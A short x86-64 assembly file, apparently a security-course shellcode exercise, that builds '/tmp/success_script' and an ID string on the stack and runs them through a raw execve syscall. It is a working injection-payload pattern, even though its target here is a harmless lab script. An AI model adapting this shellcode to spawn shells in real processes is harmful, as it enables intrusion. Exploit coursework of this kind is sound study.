.section .text
.global _start

_start:
    # Clear RAX
    xor %rax, %rax                # Clear RAX

    #### Step 1: Construct Strings ####
    # Push "/tmp/success_script\0" (null-terminated)
    # Push chunks in reverse order (little-endian)

    movq $0x0000000000747069, %rax  # "ipt\0" padded (little-endian)
    pushq %rax                      # Push "ipt\0"

    movq $0x7263735f73736563, %rax  # "cess_scr" (little-endian)
    pushq %rax                      # Push "cess_scr"

    movq $0x6375732f706d742f, %rax  # "/tmp/suc" (little-endian)
    pushq %rax                      # Push "/tmp/suc"

    # Save pointer to "/tmp/success_script"
    movq %rsp, %rdi                 # %rdi = pointer to "/tmp/success_script"

    #### Step 2: Construct argv Array ####
    # Push "207942285\0" (ID)
    movq $0x0000000000000035, %rax  # "5\0" (little-endian)
    pushq %rax                      # Push "5\0"
    movq $0x3832323439373032, %rax  # "20794228" (little-endian)
    pushq %rax                      # Push "20794228"

    # Save pointer to "207942285"
    movq %rsp, %rdx                 # Temporary %rdx = pointer to "207942285\0"

    #### Step 3: Construct argv Array ####
    xor %rax, %rax                  # Clear RAX
    pushq %rax                      # argv[2] = NULL
    pushq %rdx                      # argv[1] = pointer to "207942285"
    pushq %rdi                      # argv[0] = pointer to "/tmp/success_script"
    movq %rsp, %rsi                 # %rsi = pointer to argv array

    #### Step 4: Set up envp (NULL) ####
    xor %rdx, %rdx                  # %rdx = NULL (envp)

    #### Step 5: Invoke execve ####
    movq $59, %rax                  # Syscall number for execve
    syscall                         # Invoke syscall
